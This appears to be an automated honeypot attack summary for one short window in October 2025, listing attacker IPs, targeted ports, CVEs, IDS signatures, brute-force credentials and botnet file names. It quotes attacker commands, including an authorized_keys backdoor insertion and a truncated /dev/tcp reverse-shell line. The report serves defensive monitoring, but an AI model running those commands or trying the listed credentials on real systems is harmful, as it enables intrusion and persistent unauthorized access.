Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-15T03:01:36Z
**Timeframe:** 2025-10-15T02:20:01Z to 2025-10-15T03:00:01Z
**Files Used:**
- agg_log_20251015T022001Z.json
- agg_log_20251015T024002Z.json
- agg_log_20251015T030001Z.json

### Executive Summary
This report summarizes 21,179 malicious events recorded across the honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based attacks. A significant number of attacks were also detected by Suricata, Honeytrap, and Ciscoasa honeypots. The most notable activity includes a high number of login attempts, command executions, and the triggering of the "DoublePulsar Backdoor" signature. The top attacking IP addresses originate from various locations, and the most targeted ports include 445 (SMB), 22 (SSH), 25 (SMTP), 5060 (SIP), and 6379 (Redis).

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 7421
- Honeytrap: 4762
- Suricata: 3220
- Ciscoasa: 1779
- Sentrypeer: 1614
- Mailoney: 946
- Redishoneypot: 758
- ssh-rsa: 102
- Miniprint: 42
- Dionaea: 28
- Tanner: 43
- H0neytr4p: 30
- Dicompot: 23
- ConPot: 22
- Honeyaml: 16
- Adbhoney: 7
- Heralding: 3
- ElasticPot: 3

**Top Attacking IPs:**
- 85.111.97.34: 1186
- 180.246.71.220: 1242
- 45.78.192.86: 1217
- 124.236.108.141: 1430
- 206.191.154.180: 1379
- 86.54.42.238: 821
- 51.68.199.166: 411
- 88.210.63.16: 431
- 172.86.95.98: 408
- 172.86.95.115: 407
- 185.243.5.121: 375
- 62.141.43.183: 321
- 12.189.234.28: 298
- 72.167.52.254: 257
- 179.43.150.26: 243
- 37.221.66.149: 248
- 103.241.45.120: 228
- 138.84.41.38: 170
- 119.28.193.53: 139
- 61.12.84.15: 174
- 36.137.249.148: 119

**Top Targeted Ports/Protocols:**
- TCP/445: 1238
- 22: 1230
- 5060: 1614
- 6379: 918
- 25: 884
- 5903: 187
- 8333: 158
- 5901: 84
- 5908: 83
- 5909: 83
- 80: 39
- 443: 32
- 9100: 40

**Most Common CVEs:**
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-1999-0183
- CVE-2019-11500 CVE-2019-11500
- CVE-2021-3449 CVE-2021-3449

**Commands Attempted by Attackers:**
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- uname -a
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- crontab -l
- whoami
- top
- nohup bash -c "exec 6<>/dev/tcp/..."

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1235
- 2024766: 1235
- ET DROP Dshield Block Listed Source group 1: 667
- 2402000: 667
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 252
- 2023753: 252
- ET SCAN NMAP -sS window 1024: 166
- 2009582: 166
- ET HUNTING RDP Authentication Bypass Attempt: 108
- 2034857: 108
- ET INFO Reserved Internal IP Traffic: 56
- 2002752: 56
- ET INFO CURL User Agent: 32
- 2002824: 32

**Users / Login Attempts:**
- root/: 76
- 345gs5662d34/345gs5662d34: 21
- root/12345: 13
- root/Qaz123qaz: 11
- root/Password@2025: 9
- root/123@@@: 11
- debian/debian666: 6
- guest/444: 6
- config/config2000: 6
- operator/operator2005: 6
- blank/123654: 6
- centos/centos2004: 6

**Files Uploaded/Downloaded:**
- arm.urbotnetisass;
- arm.urbotnetisass
- arm5.urbotnetisass;
- arm5.urbotnetisass
- arm6.urbotnetisass;
- arm6.urbotnetisass
- arm7.urbotnetisass;
- arm7.urbotnetisass
- x86_32.urbotnetisass;
- x86_32.urbotnetisass
- mips.urbotnetisass;
- mips.urbotnetisass
- mipsel.urbotnetisass;
- mipsel.urbotnetisass

**HTTP User-Agents:**
- No HTTP user agents were recorded in the specified timeframe.

**SSH Clients and Servers:**
- No specific SSH clients or servers were recorded in the specified timeframe.

**Top Attacker AS Organizations:**
- No attacker AS organizations were recorded in the specified timeframe.

### Key Observations and Anomalies
- A large number of commands executed by attackers are focused on reconnaissance (e.g., `uname -a`, `cat /proc/cpuinfo`) and establishing persistence by adding an SSH key to the `authorized_keys` file.
- The high number of "DoublePulsar Backdoor" signatures indicates attempts to exploit the EternalBlue vulnerability (MS17-010).
- The `nohup bash -c "exec 6<>/dev/tcp/..."` commands are a common technique used by attackers to establish a reverse shell to a command and control (C2) server.
- The variety of usernames and passwords attempted shows that attackers are using a combination of default credentials, common passwords, and brute-force techniques.
- The downloading of files with names like `arm.urbotnetisass` suggests the deployment of malware targeting embedded and IoT devices.